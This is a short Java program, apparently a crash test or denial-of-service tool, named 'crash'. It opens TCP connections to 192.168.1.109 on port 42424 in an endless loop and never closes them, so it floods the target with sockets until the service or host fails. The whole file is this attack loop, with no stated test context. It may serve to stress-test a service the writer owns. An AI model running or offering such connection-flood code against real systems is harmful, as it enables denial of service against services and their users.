import java.net.Socket;

public class crash {
    public static void main(String[] args) throws Exception {
        for(;;){
            Socket socket = new Socket("192.168.1.109", 42424);
        }
    }

}
